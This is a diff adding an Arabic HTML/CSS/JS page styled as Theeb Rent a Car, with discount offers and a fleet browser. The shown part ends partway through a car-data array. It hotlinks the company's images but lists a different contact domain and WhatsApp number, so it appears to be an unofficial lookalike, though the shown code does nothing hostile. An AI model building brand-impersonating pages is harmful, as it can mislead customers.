@@ -1,0 +1,1286 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>ذيب لتأجير السيارات - اختر العرض</title>
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', 'Tahoma', 'Helvetica Neue', sans-serif; 
+            background-color: #f0f2f5; 
+            direction: rtl; 
+            overflow-x: hidden;
+        }
+        
+        /* ===== صفحة العروض ===== */
+        #offersPage {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            background: linear-gradient(135deg, #0f6aa4 0%, #1a4d3e 100%);
+        }
+        .offers-card {
+            max-width: 480px;
+            width: 100%;
+            background: white;
+            border-radius: 32px;
+            overflow: hidden;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.25);
+        }
+        .offers-header {
+            background: linear-gradient(135deg, #0f6aa4, #1a4d3e);
+            padding: 30px 20px 20px;
+            text-align: center;
+        }
+        .offers-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 10px;
+        }
+        .offers-logo-icon {
+            width: 55px;
+            height: 55px;
+            background: white;
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .offers-logo-icon img {
+            width: 45px;
+            height: 45px;
+            object-fit: contain;
+        }
+        .offers-logo-text h1 {
+            font-size: 22px;
+            font-weight: 800;
+            color: white;
+        }
+        .offers-logo-text p {
+            font-size: 12px;
+            opacity: 0.9;
+            color: white;
+        }
+        .offers-header h2 {
+            color: white;
+            font-size: 20px;
+            font-weight: 700;
+            margin-top: 8px;
+        }
+        .offers-body {
+            padding: 25px 20px;
+        }
+        .offers-sub-title {
+            font-size: 15px;
+            color: #1a2e3a;
+            font-weight: 600;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .offers-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+            margin-bottom: 20px;
+        }
+        .offer-item {
+            background: #f8fafc;
+            border: 2px solid #e2e8f0;
+            border-radius: 20px;
+            padding: 18px 20px;
+            display: flex;
+            align-items: center;
+            gap: 18px;
+            transition: 0.25s;
+            cursor: pointer;
+        }
+        .offer-item:active { transform: scale(0.97); }
+        .offer-item.selected {
+            border-color: #0f6aa4;
+            background: #eef6fc;
+            box-shadow: 0 4px 12px rgba(15,106,164,0.12);
+        }
+        .offer-icon {
+            width: 56px;
+            height: 56px;
+            background: white;
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 26px;
+            color: #0f6aa4;
+            flex-shrink: 0;
+            box-shadow: 0 3px 8px rgba(0,0,0,0.04);
+        }
+        .offer-info { flex: 1; }
+        .offer-info h4 { font-size: 17px; font-weight: 700; color: #1a2e3a; }
+        .offer-info p { font-size: 13px; color: #4a5a6a; margin-top: 2px; }
+        .offer-badge {
+            background: #0f6aa4;
+            color: white;
+            padding: 4px 12px;
+            border-radius: 40px;
+            font-size: 13px;
+            font-weight: 700;
+            white-space: nowrap;
+        }
+        .offer-item.selected .offer-badge {
+            background: #1a4d3e;
+        }
+        .offer-selected-banner {
+            background: #e6f4ef;
+            border-radius: 16px;
+            padding: 14px 18px;
+            margin: 0 0 18px 0;
+            display: none;
+            align-items: center;
+            gap: 12px;
+            border-right: 4px solid #1a4d3e;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+        }
+        .offer-selected-banner i { color: #1a4d3e; font-size: 20px; }
+        .offer-selected-banner .selected-text {
+            font-weight: 700;
+            color: #1a4d3e;
+            font-size: 15px;
+            flex: 1;
+        }
+        .offer-selected-banner .selected-discount {
+            background: #1a4d3e;
+            color: white;
+            padding: 4px 14px;
+            border-radius: 40px;
+            font-size: 14px;
+            font-weight: 700;
+        }
+        .btn-offer {
+            width: 100%;
+            background: linear-gradient(135deg, #0f6aa4, #1a4d3e);
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 40px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .btn-offer:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .btn-offer:not(:disabled):hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 15px rgba(15, 106, 164, 0.3);
+        }
+
+        /* ===== صفحة الأسطول ===== */
+        #fleetPage {
+            display: none;
+            overflow-x: hidden;
+        }
+        .discount-banner-fleet {
+            background: #e6f4ef;
+            border-radius: 16px;
+            padding: 14px 20px;
+            margin: 15px 20px 0;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            border-right: 4px solid #1a4d3e;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+        }
+        .discount-banner-fleet i { color: #1a4d3e; font-size: 22px; }
+        .discount-banner-fleet .discount-text {
+            font-weight: 700;
+            color: #1a4d3e;
+            font-size: 15px;
+        }
+        .discount-banner-fleet .discount-percent {
+            background: #1a4d3e;
+            color: white;
+            padding: 4px 14px;
+            border-radius: 40px;
+            font-size: 14px;
+            font-weight: 700;
+            margin-right: auto;
+        }
+        .back-to-offers-btn {
+            background: none;
+            border: none;
+            color: #0f6aa4;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            padding: 10px 20px 5px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .back-to-offers-btn:hover { color: #1a4d3e; }
+
+        /* Hero Section */
+        .car-fleet-hero { 
+            display: flex; 
+            flex-wrap: wrap; 
+            align-items: center; 
+            justify-content: space-between; 
+            background: linear-gradient(135deg, #0f6aa4 0%, #1e4a76 100%); 
+            margin: 15px; 
+            border-radius: 24px; 
+            padding: 30px 25px; 
+            color: white; 
+            overflow: hidden;
+        }
+        
+        .car-fleet-hero-left h1 { 
+            font-size: clamp(1.8rem, 6vw, 3rem); 
+            font-weight: 800; 
+            margin-bottom: 15px; 
+        }
+        
+        .car-fleet-hero-left .d-flex { 
+            flex-wrap: wrap; 
+            gap: 10px; 
+        }
+        
+        .car-fleet-hero-left .d-flex div { 
+            background: rgba(255,255,255,0.2); 
+            padding: 8px 16px; 
+            border-radius: 40px; 
+            font-size: 0.9rem; 
+        }
+        
+        .car-fleet-hero-right { 
+            position: relative; 
+            width: 100%; 
+            max-width: 350px; 
+            height: 200px; 
+            margin-top: 20px; 
+        }
+        
+        @media (min-width: 768px) {
+            .car-fleet-hero-right { 
+                margin-top: 0; 
+                width: 350px; 
+            }
+        }
+        
+        #car_fleet_hero_background { 
+            width: 100%; 
+            height: 100%; 
+            object-fit: cover; 
+            border-radius: 20px; 
+        }
+        
+        #car_fleet_hero_carousel { 
+            position: absolute; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+        }
+        
+        .cars { 
+            position: absolute; 
+            width: 100%; 
+            text-align: center; 
+            transition: all 0.5s ease; 
+        }
+        
+        .cars h1 { 
+            font-size: 0.9rem; 
+            background: rgba(0,0,0,0.6); 
+            display: inline-block; 
+            padding: 4px 12px; 
+            border-radius: 20px; 
+            margin-bottom: 10px; 
+        }
+        
+        #car_fleet_hero_img img { 
+            max-width: 160px; 
+            height: auto; 
+        }
+        
+        @media (min-width: 768px) {
+            #car_fleet_hero_img img { 
+                max-width: 180px; 
+            }
+        }
+        
+        .cars h3 { 
+            font-size: 12px; 
+            margin-top: 8px; 
+            color: #ddd; 
+        }
+        
+        .car-fleet-arrow-left, .car-fleet-arrow-right { 
+            position: absolute; 
+            top: 50%; 
+            transform: translateY(-50%); 
+            background: rgba(255,255,255,0.4); 
+            width: 32px; 
+            height: 32px; 
+            border-radius: 50%; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            cursor: pointer; 
+            z-index: 10; 
+            transition: all 0.3s;
+        }
+        
+        .car-fleet-arrow-left:hover, .car-fleet-arrow-right:hover {
+            background: rgba(255,255,255,0.6);
+        }
+        
+        .car-fleet-arrow-left { left: 5px; }
+        .car-fleet-arrow-right { right: 5px; }
+        
+        /* Browse Section */
+        .car-fleet-browse { 
+            padding: 15px 20px; 
+            overflow-x: hidden;
+        }
+        
+        .car-fleet-browse h2 { 
+            font-size: clamp(1.4rem, 5vw, 1.8rem); 
+            color: #1e2a3e; 
+            margin-bottom: 25px; 
+            font-weight: 700;
+        }
+        
+        /* Filter */
+        .car-fleet-cards { 
+            display: flex; 
+            gap: 15px; 
+            flex-wrap: wrap; 
+            margin-bottom: 30px; 
+        }
+        
+        .car-fleet-cards .input-group { 
+            flex: 1; 
+            min-width: 160px; 
+        }
+        
+        .car-fleet-cards label { 
+            display: block; 
+            margin-bottom: 8px; 
+            font-weight: 600; 
+            color: #1e2a3e; 
+            font-size: 0.9rem;
+        }
+        
+        .car-fleet-select { 
+            width: 100%; 
+            height: 48px; 
+            border-radius: 12px; 
+            border: 1px solid #e0e0e0; 
+            padding: 0 12px; 
+            background: white; 
+            font-size: 0.9rem;
+        }
+        
+        .car-fleet-cards button { 
+            background: #0f6aa4; 
+            color: white; 
+            border: none; 
+            padding: 0 25px; 
+            border-radius: 12px; 
+            height: 48px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            transition: all 0.3s;
+            margin-top: 28px;
+        }
+        
+        .car-fleet-cards button:hover {
+            background: #0a4d7a;
+        }
+        
+        /* شبكة السيارات */
+        .car-fleet-container { 
+            display: grid; 
+            grid-template-columns: repeat(2, 1fr);
+            gap: 20px; 
+            padding: 20px; 
+            overflow-x: hidden;
+        }
+        
+        @media (min-width: 768px) {
+            .car-fleet-container { 
+                grid-template-columns: repeat(3, 1fr);
+            }
+        }
+        
+        @media (min-width: 1200px) {
+            .car-fleet-container { 
+                grid-template-columns: repeat(4, 1fr);
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .car-fleet-container { 
+                grid-template-columns: repeat(2, 1fr);
+                gap: 12px;
+                padding: 12px;
+            }
+        }
+        
+        /* Car Card */
+        .car-card-sm { 
+            background: white; 
+            border-radius: 16px; 
+            overflow: hidden; 
+            box-shadow: 0 5px 15px rgba(0,0,0,0.08); 
+            transition: all 0.3s ease; 
+            display: flex; 
+            flex-direction: column; 
+        }
+        
+        .car-card-sm:hover { 
+            transform: translateY(-3px); 
+            box-shadow: 0 8px 25px rgba(0,0,0,0.12);
+        }
+        
+        .car-card-sm .car-category, 
+        .car-card-sm .car-year { 
+            display: inline-block; 
+            background: #eef2f6; 
+            padding: 3px 10px; 
+            border-radius: 20px; 
+            font-size: 10px; 
+            margin: 10px 6px 6px 10px; 
+        }
+        
+        .car-card-sm .card-title { 
+            font-size: 0.85rem; 
+            font-weight: 700; 
+            padding: 0 10px; 
+            margin: 5px 0 8px; 
+            line-height: 1.4; 
+            color: #1e2a3e;
+            min-height: 40px;
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+        }
+        
+        .car-card-sm .card-img-top { 
+            width: 100%; 
+            height: 120px; 
+            object-fit: contain; 
+            padding: 8px; 
+            background: #fafafa;
+        }
+        
+        .car-features { 
+            display: flex; 
+            justify-content: space-around; 
+            list-style: none; 
+            padding: 8px; 
+            margin: 0; 
+            border-top: 1px solid #eee; 
+            border-bottom: 1px solid #eee; 
+            background: #fafafa;
+        }
+        
+        .car-features-item { 
+            text-align: center; 
+            font-size: 10px; 
+            color: #555;
+        }
+        
+        .car-features-item img { 
+            width: 16px; 
+            display: block; 
+            margin: 0 auto 3px; 
+        }
+        
+        .car-card-sm-price { 
+            padding: 10px; 
+            text-align: center; 
+        }
+        
+        .car-card-sm-price h3 { 
+            margin: 0; 
+            font-size: 1rem; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            gap: 3px; 
+            color: #0f6aa4;
+        }
+        
+        .car-card-sm-price .old-price {
+            font-size: 12px;
+            text-decoration: line-through;
+            color: #999;
+            font-weight: 400;
+            margin-left: 6px;
+        }
+        
+        .car-card-sm-price h3 span {
+            font-size: 10px;
+            color: #777;
+            font-weight: normal;
+        }
+        
+        .car-card-sm-price button { 
+            background: #0f6aa4; 
+            color: white; 
+            border: none; 
+            padding: 8px 12px; 
+            border-radius: 40px; 
+            margin-top: 8px; 
+            cursor: pointer; 
+            width: 100%; 
+            font-weight: bold; 
+            font-size: 12px;
+            transition: all 0.3s;
+        }
+        
+        .car-card-sm-price button:hover {
+            background: #0a4d7a;
+            transform: scale(0.98);
+        }
+        
+        /* Footer */
+        .footer {
+            background: linear-gradient(135deg, #0a2a44 0%, #0f3a5a 100%);
+            color: #fff;
+            margin-top: 60px;
+            padding: 50px 20px 20px;
+            overflow: hidden;
+        }
+        
+        .footer-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 40px;
+            margin-bottom: 40px;
+        }
+        
+        .footer-section h3 {
+            font-size: 1.2rem;
+            margin-bottom: 20px;
+            position: relative;
+            display: inline-block;
+        }
+        
+        .footer-section h3:after {
+            content: '';
+            position: absolute;
+            bottom: -8px;
+            right: 0;
+            width: 50px;
+            height: 3px;
+            background: #0f6aa4;
+            border-radius: 2px;
+        }
+        
+        .footer-section p {
+            line-height: 1.8;
+            color: #ddd;
+            margin-bottom: 15px;
+            font-size: 0.85rem;
+        }
+        
+        .footer-section .contact-info {
+            list-style: none;
+            padding: 0;
+        }
+        
+        .footer-section .contact-info li {
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: #ddd;
+            font-size: 0.85rem;
+        }
+        
+        .footer-section .contact-info li i {
+            width: 25px;
+            color: #0f6aa4;
+            font-size: 1rem;
+        }
+        
+        .social-links {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            margin-top: 20px;
+        }
+        
+        .social-links a {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 36px;
+            height: 36px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 50%;
+            color: #fff;
+            transition: all 0.3s;
+            font-size: 1rem;
+        }
+        
+        .social-links a:hover {
+            background: #0f6aa4;
+            transform: translateY(-3px);
+        }
+        
+        .app-buttons {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-top: 15px;
+        }
+        
+        .app-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.2);
+            padding: 6px 12px;
+            border-radius: 10px;
+            color: #fff;
+            text-decoration: none;
+            transition: all 0.3s;
+            font-size: 0.75rem;
+        }
+        
+        .app-btn i {
+            font-size: 1.1rem;
+        }
+        
+        .app-btn:hover {
+            background: #0f6aa4;
+            border-color: #0f6aa4;
+            transform: translateY(-2px);
+        }
+        
+        .app-btn span small {
+            display: block;
+            font-size: 0.6rem;
+            opacity: 0.8;
+        }
+        
+        .footer-bottom {
+            text-align: center;
+            padding-top: 25px;
+            border-top: 1px solid rgba(255,255,255,0.1);
+            font-size: 0.75rem;
+            color: #aaa;
+        }
+        
+        .newsletter-form {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        
+        .newsletter-input {
+            padding: 10px;
+            border-radius: 10px;
+            border: none;
+            background: rgba(255,255,255,0.1);
+            color: #fff;
+            font-size: 0.85rem;
+        }
+        
+        .newsletter-input::placeholder {
+            color: #aaa;
+        }
+        
+        .newsletter-btn {
+            background: #0f6aa4;
+            border: none;
+            padding: 8px;
+            border-radius: 10px;
+            color: #fff;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 0.85rem;
+        }
+        
+        .newsletter-btn:hover {
+            background: #0a4d7a;
+        }
+        
+        ::-webkit-scrollbar {
+            width: 6px;
+            height: 6px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: #f1f1f1;
+            border-radius: 10px;
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: #0f6aa4;
+            border-radius: 10px;
+        }
+
+        /* Toast */
+        .toast-custom {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            right: 20px;
+            background: #1a2e3a;
+            color: white;
+            padding: 14px 20px;
+            border-radius: 60px;
+            text-align: center;
+            font-weight: 600;
+            z-index: 999;
+            transform: translateY(150%);
+            transition: 0.3s;
+        }
+        .toast-custom.show { transform: translateY(0); }
+
+        /* زر الترتيب */
+        .sort-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: 28px;
+        }
+        .sort-wrapper label {
+            font-weight: 600;
+            color: #1e2a3e;
+            font-size: 0.9rem;
+            white-space: nowrap;
+            margin: 0;
+        }
+        .sort-wrapper select {
+            height: 48px;
+            border-radius: 12px;
+            border: 1px solid #e0e0e0;
+            padding: 0 12px;
+            background: white;
+            font-size: 0.9rem;
+            min-width: 140px;
+        }
+
+        /* منع التمرير الجانبي */
+        .container-fluid, .row {
+            overflow-x: hidden !important;
+        }
+    </style>
+</head>
+<body>
+
+<!-- ===== صفحة العروض ===== -->
+<div id="offersPage">
+    <div class="offers-card">
+        <div class="offers-header">
+            <div class="offers-logo">
+                <div class="offers-logo-icon">
+                    <img src="https://www.theebonline.com/wp-content/themes/Theeb-theme/images/login-logo.png" alt="شعار ذيب">
+                </div>
+                <div class="offers-logo-text">
+                    <h1>ذيب لتأجير السيارات</h1>
+                    <p>THEEB RENT A CAR</p>
+                </div>
+            </div>
+            <h2>اختر عرض التأجير</h2>
+        </div>
+        <div class="offers-body">
+            <div class="offers-sub-title">👈 اختر نوع التأجير واحصل على خصم فوري</div>
+            
+            <!-- رسالة العرض المختار -->
+            <div class="offer-selected-banner" id="offerSelectedBanner">
+                <i class="fas fa-check-circle"></i>
+                <span class="selected-text" id="selectedOfferText">تم اختيار العرض</span>
+                <span class="selected-discount" id="selectedOfferDiscount">5%</span>
+            </div>
+            
+            <div class="offers-grid">
+                <div class="offer-item" data-type="daily" data-discount="5">
+                    <div class="offer-icon"><i class="fas fa-sun"></i></div>
+                    <div class="offer-info">
+                        <h4>تأجير يومي</h4>
+                        <p>مرونة كاملة ليوم واحد</p>
+                    </div>
+                    <span class="offer-badge">5% خصم</span>
+                </div>
+                <div class="offer-item" data-type="weekly" data-discount="15">
+                    <div class="offer-icon"><i class="fas fa-calendar-week"></i></div>
+                    <div class="offer-info">
+                        <h4>تأجير أسبوعي</h4>
+                        <p>أفضل قيمة لمدة 7 أيام</p>
+                    </div>
+                    <span class="offer-badge">15% خصم</span>
+                </div>
+                <div class="offer-item" data-type="monthly" data-discount="30">
+                    <div class="offer-icon"><i class="fas fa-calendar-alt"></i></div>
+                    <div class="offer-info">
+                        <h4>تأجير شهري</h4>
+                        <p>خصم مميز للإيجار الطويل</p>
+                    </div>
+                    <span class="offer-badge">30% خصم</span>
+                </div>
+            </div>
+            <button class="btn-offer" id="continueToFleetBtn" disabled>استعراض الأسطول</button>
+        </div>
+    </div>
+</div>
+
+<!-- ===== صفحة الأسطول ===== -->
+<div id="fleetPage">
+    <!-- لافتة الخصم -->
+    <div class="discount-banner-fleet" id="discountBanner">
+        <i class="fas fa-tags"></i>
+        <span class="discount-text" id="discountText">خصم 5% على جميع السيارات</span>
+        <span class="discount-percent" id="discountPercent">5%</span>
+    </div>
+    
+    <button class="back-to-offers-btn" onclick="goBackToOffers()">
+        <i class="fas fa-arrow-right"></i> تغيير العرض
+    </button>
+
+    <div class="car-fleet-page">
+        <div id="car-fleet-hero" class="car-fleet-hero">
+            <div class="car-fleet-hero-left">
+                <h1>أسطول السيارات</h1>
+                <div class="d-flex flex-wrap">
+                    <div class="d-flex align-items-center"><i class="fa-solid fa-check me-2"></i> أسطول متنوع</div>
+                    <div class="d-flex align-items-center"><i class="fa-solid fa-check me-2"></i> أحدث الموديلات</div>
+                    <div class="d-flex align-items-center"><i class="fa-solid fa-check me-2"></i> فئات متعددة</div>
+                </div>
+            </div>
+            <div class="car-fleet-hero-right">
+                <img id="car_fleet_hero_background" src="https://www.theebonline.com/wp-content/themes/Theeb-theme/images/car_fleet_hero_background.png" alt="خلفية">
+                <div id="car_fleet_hero_carousel">
+                    <div class="cars" id="newest-car-0">
+                        <h1>2022</h1>
+                        <div id="car_fleet_hero_img"><img src="https://www.theebonline.com/wp-content/uploads/2022/05/services-car.png" alt="سيارة"></div>
+                        <h3>مرسيدس S 200</h3>
+                    </div>
+                    <div class="cars" id="newest-car-1" style="opacity:0;">
+                        <h1>2023</h1>
+                        <div id="car_fleet_hero_img"><img src="https://www.theebonline.com/wp-content/uploads/2022/05/car_fleet_hero_mercedes.png" alt="سيارة"></div>
+                        <h3>مرسيدس E 200</h3>
+                    </div>
+                    <i class="fa-solid fa-chevron-left car-fleet-arrow-left"></i>
+                    <i class="fa-solid fa-chevron-right car-fleet-arrow-right"></i>
+                </div>
+            </div>
+        </div>
+
+        <div class="car-fleet-browse">
+            <h2>تصفح أسطول سياراتنا</h2>
+            <form id="filterForm" action="#" method="POST">
+                <div class="car-fleet-cards">
+                    <div class="input-group">
+                        <label><i class="fa-solid fa-car me-1"></i> نوع السيارة</label>
+                        <select id="car_types" class="form-select car-fleet-select">
+                            <option selected value="All Type">جميع الأنواع</option>
+                            <option value="صغيرة">صغيرة</option>
+                            <option value="Economy">اقتصادية</option>
+                            <option value="Electric">كهربائي</option>
+                            <option value="Family">عائلية</option>
+                            <option value="Full Size">الحجم الكامل</option>
+                            <option value="Hybrid">هجين</option>
+                            <option value="Intermediate">المتوسطة</option>
+                            <option value="Luxury Elite">فخمة فارهة</option>
+                            <option value="Luxury">فخمة</option>
+                            <option value="Pickup">وانيت</option>
+                            <option value="SUV Sprt Ut Vehicle">سيارات الدفع الرباعي</option>
+                            <option value="Crossover">كروس أوفر</option>
+                        </select>
+                    </div>
+                    <div class="input-group">
+                        <label><i class="fa-solid fa-building me-1"></i> الشركة المصنعة</label>
+                        <select id="car_brands" class="form-select car-fleet-select">
+                            <option selected value="All Brands">جميع العلامات التجارية</option>
+                            <option value="هونداي">هونداي</option>
+                            <option value="GEELY">جيلي</option>
+                            <option value="JAC">JAC</option>
+                            <option value="تويوتا">تويوتا</option>
+                            <option value="سوزوكي">سوزوكي</option>
+                            <option value="LUCID">لوسيد</option>
+                            <option value="كيا">كيا</option>
+                            <option value="شيفرولية">شيفروليه</option>
+                            <option value="فورد">فورد</option>
+                            <option value="GAC">GAC</option>
+                            <option value="مرسيدس">مرسيدس</option>
+                            <option value="أودي">أودي</option>
+                            <option value="BMW">بي ام دبليو</option>
+                            <option value="ايسوزو">ايسوزو</option>
+                            <option value="LAND ROVER">لاند روفر</option>
+                            <option value="نيسان">نيسان</option>
+                            <option value="ROX">روكس</option>
+                            <option value="رانج روفر">رانج روفر</option>
+                        </select>
+                    </div>
+                    <div class="sort-wrapper">
+                        <label><i class="fa-solid fa-arrow-up-wide-short me-1"></i> ترتيب:</label>
+                        <select id="sortPrice" class="form-select car-fleet-select">
+                            <option value="low-high">السعر: من الأقل للأعلى</option>
+                            <option value="high-low">السعر: من الأعلى للأقل</option>
+                        </select>
+                    </div>
+                    <div><button type="button" id="filterBtn"><i class="fa-solid fa-magnifying-glass me-1"></i> بحث</button></div>
+                </div>
+            </form>
+        </div>
+
+        <div id="car-fleet-browse" class="car-fleet-container"></div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-container">
+            <div class="footer-section">
+                <h3>ذيب لتأجير السيارات</h3>
+                <p>خدمة تأجير سيارات متميزة تقدم أحدث الموديلات بأفضل الأسعار. أسطول متنوع يلبي جميع احتياجاتك.</p>
+                <div class="social-links">
+                    <a href="#" target="_blank"><i class="fab fa-facebook-f"></i></a>
+                    <a href="#" target="_blank"><i class="fab fa-twitter"></i></a>
+                    <a href="#" target="_blank"><i class="fab fa-instagram"></i></a>
+                    <a href="#" target="_blank"><i class="fab fa-linkedin-in"></i></a>
+                    <a href="#" target="_blank"><i class="fab fa-whatsapp"></i></a>
+                    <a href="#" target="_blank"><i class="fab fa-youtube"></i></a>
+                </div>
+            </div>
+            
+            <div class="footer-section">
+                <h3>تواصل معنا</h3>
+                <ul class="contact-info">
+                    واتساب
+                    <li><i class="fas fa-mobile-alt"></i> <span>8946 829 59 966+</span></li>
+                    <li><i class="fas fa-envelope"></i> <span>info@theebcar.com</span></li>
+                    <li><i class="fas fa-map-marker-alt"></i> <span>الرياض، المملكة العربية السعودية</span></li>
+                    <li><i class="fas fa-clock"></i> <span>٨ صباحاً - ١٢ منتصف الليل</span></li>
+                </ul>
+            </div>
+            
+            
+            <div class="footer-section">
+                <h3>النشرة البريدية</h3>
+                <p>اشترك ليصلك كل جديد عن العروض</p>
+                <form class="newsletter-form" onsubmit="event.preventDefault(); alert('شكراً لاشتراكك!');">
+                    <input type="email" class="newsletter-input" placeholder="بريدك الإلكتروني" required>
+                    <button type="submit" class="newsletter-btn">اشترك الآن <i class="fas fa-paper-plane"></i></button>
+                </form>
+            </div>
+        </div>
+        
+        <div class="footer-bottom">
+            <p>&copy; 2024 ذيب لتأجير السيارات. جميع الحقوق محفوظة.</p>
+        </div>
+    </footer>
+</div>
+
+<!-- Toast -->
+<div class="toast-custom" id="toast"></div>
+
+<script>
+    // ===== بيانات الأسطول =====
+    const allCars = [
+        {cat:"صغيرة",year:"2024",title:"هيونداي اكسنت 2024",img:"https://www.theebonline.com/carimages/CO108.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:150,brand:"هونداي"},
+        {cat:"صغيرة",year:"2025",title:"هيونداي أكسنت-جل الذكية 2025",img:"https://www.theebonline.com/carimages/CO112.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:185,brand:"هونداي"},
+        {cat:"صغيرة",year:"2025",title:"جيلي إمجراند GS - 2025",img:"https://www.theebonline.com/carimages/CO114.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:150,brand:"GEELY"},
+        {cat:"صغيرة",year:"2025",title:"JAC J7 الذكي - 2025",img:"https://www.theebonline.com/carimages/CO116.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:150,brand:"JAC"},
+        {cat:"صغيرة",year:"2026",title:"تويوتا يارس Yaris Y - 2026",img:"https://www.theebonline.com/carimages/CO117.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:190,brand:"تويوتا"},
+        {cat:"صغيرة",year:"2026",title:"هيونداي أكسنت - 2026",img:"https://www.theebonline.com/carimages/CO118.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:190,brand:"هونداي"},
+        {cat:"صغيرة",year:"2026",title:"جيلي إمجراند GS - 2026",img:"https://www.theebonline.com/carimages/CO120.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:180,brand:"GEELY"},
+        {cat:"Economy",year:"2024",title:"سوزوكي ديزاير - 2024",img:"https://www.theebonline.com/carimages/EC76.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:110,brand:"سوزوكي"},
+        {cat:"Economy",year:"2025",title:"هيونداي جراند I10-2025",img:"https://www.theebonline.com/carimages/EC78.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:125,brand:"هونداي"},
+        {cat:"Economy",year:"2025",title:"سوزوكي دزاير جي إل بلس - 2025",img:"https://www.theebonline.com/carimages/EC80.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:125,brand:"سوزوكي"},
+        {cat:"Economy",year:"2026",title:"هيونداي جراند I10 - 2026",img:"https://www.theebonline.com/carimages/EC81.jpg",seats:5,trans:"اوتوماتيكي",doors:4,price:140,brand:"هونداي"},
+        {cat:"Electric",year:"2023",title:"لوسيد جراند تورينج",img:"https://www.theebonline.com/carimages/EV2.jpg",seats:5,trans:"كهربائي",doors:4,price:1800,brand:"LUCID"},
+        {cat:"Electric",year:"2024",title:"لوسد اير جراند تورينج - 2024",img:"https://www.theebonline.com/carimages/EV3.jpg",seats:5,trans:"كهربائي",doors:4,price:2100,brand:"LUCID"},
+        {cat:"Family",year:"2025",title:"كيا-كارنيفال - 2025",img:"https://www.theebonline.com/carimages/FA100.jpg",seats:8,trans:"اوتوماتيكي",doors:4,price:500,brand:"كيا"},
+        {cat:"Family",year:"2025",title:"هيونداي ستاريا 9 مقاعد - 2025",img:"https://www.theebonline.com/carimages/FA101.jpg",seats:9,trans:"اوتوماتيكي",doors:4,price:500,brand:"هونداي"},
+        {cat:"Family",year:"2025",title:"شيفروليه سوبربان LS 4X2 - 2025",img:"https://www.theebonline.com/carimages/FA102.jpg",seats:9,trans:"اوتوماتيكي",doors:5,price:850,brand:"شيفرولية"},
+        {cat:"Family",year:"2026",title:"هيونداي ستاريا 9 مقاعد - 2026",img:"https://www.theebonline.com/carimages/FA103.jpg",seats:9,trans:"اوتوماتيكي",doors:4,price:550,brand:"هونداي"},
+        {cat:"Family",year:"2026",title:"شيفروليه سوبربان LS 4X4 2026",img:"https://www.theebonline.com/carimages/FA108.jpg",seats:9,trans:"اوتوماتيكي",doors:5,price:950,brand:"شيفرولية"},
+        {cat:"Family",year:"2024",title:"هيونداي ستاريا 7 مقاعد - 2024",img:"https://www.theebonline.com/carimages/FA95.jpg",seats:7,trans:"اوتوماتيكي",doors:4,price:500,brand:"هونداي"},
+        {cat:"Family",year:"2024",title:"هيونداي ستاريا 9 مقاعد - 2024",img:"https://www.theebonline.com/carimages/FA97.jpg",seats:9,trans:"اوتوماتيكي",doors:4,price:450,brand:"هونداي"},
